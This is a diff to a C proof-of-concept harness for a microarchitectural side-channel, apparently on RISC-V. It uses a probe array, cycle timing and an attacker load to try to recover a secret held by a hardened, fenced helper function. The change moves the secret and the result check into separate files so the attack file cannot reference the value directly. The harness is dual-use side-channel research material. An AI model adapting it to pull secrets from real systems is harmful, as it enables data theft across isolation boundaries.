@@ -40,16 +40,11 @@
 
 #define SENTINEL     0xAAAAAAAAAAAAAAAAULL
 
-#ifndef SECRET_VAL
-#define SECRET_VAL   0x1122334455667788ULL
-#endif
-
 static uint8_t probe[PROBE_SZ] __attribute__((aligned(LINE)));
 static volatile uint64_t noise[NOISE][NPAT];
 static volatile uint64_t atk_buf[64];
 static volatile uint64_t zero_buf[8];
 static volatile uint8_t flushbuf[FLUSH_SZ];
-static volatile uint64_t secret_box = SECRET_VAL;
 
 static inline uint64_t
 rdcycle(void)
@@ -73,20 +68,11 @@ atk_load(volatile uint64_t *base, uint64_t idx)
     return base[idx & 63];
 }
 
-/* Hardened helper: branchless, no data-dependent memory access, overwrites its
- * value register, and executes a serialising `fence.i` before returning. */
-__attribute__((noinline, noclone, noipa))
-static uint64_t
-victim(uint64_t token)
-{
-    uint64_t s = secret_box;
-    uint64_t ok = (s == token);
-    asm volatile("" : "+r"(s));
-    s = 0;
-    asm volatile("" : "+r"(s));
-    asm volatile("fence.i" ::: "memory");
-    return ok;
-}
+/* The target value and the helper live in a separate translation unit
+ * (egdiff_secret.c), so this file has no architectural reference to the value
+ * it is supposed to obtain. */
+extern uint64_t victim_value_fenced(uint64_t token);
+extern int oracle_report_v2(uint64_t recovered, int arch_ok, uint64_t sink);
 
 static uint64_t
 mix(uint64_t x)
@@ -121,7 +107,7 @@ main(void)
             for (int i = 0; i < CAP; i++) {
                 for (int k = 0; k < NOISE; k++)
                     sink += noise[k][i & (NPAT - 1)];
-                (void)victim(0);            /* the single constant load */
+                (void)victim_value_fenced(0);   /* the single constant load */
                 atk_buf[0] = 0;
                 sink += atk_load(atk_buf, 0);
             }
@@ -191,13 +177,7 @@ main(void)
     }
 
     /* ---- Architectural checksum: the harness must have done what it claims ---- */
-    uint64_t arch_ok = (secret_box != 0) &&
-                       (victim(0) == 0) &&
-                       (atk_buf[0] == SENTINEL);
+    uint64_t arch_ok = (atk_buf[0] == SENTINEL);
 
-    printf("poc_v2 secret=%016llx recovered=%016llx sink=%llu arch=%s %s\n",
-           (unsigned long long)secret_box, (unsigned long long)recovered,
-           (unsigned long long)sink, arch_ok ? "OK" : "BAD",
-           (arch_ok && recovered == secret_box) ? "MATCH" : "NO-MATCH");
-    return (arch_ok && recovered == secret_box) ? 0 : 1;
+    return oracle_report_v2(recovered, arch_ok, sink);
 }
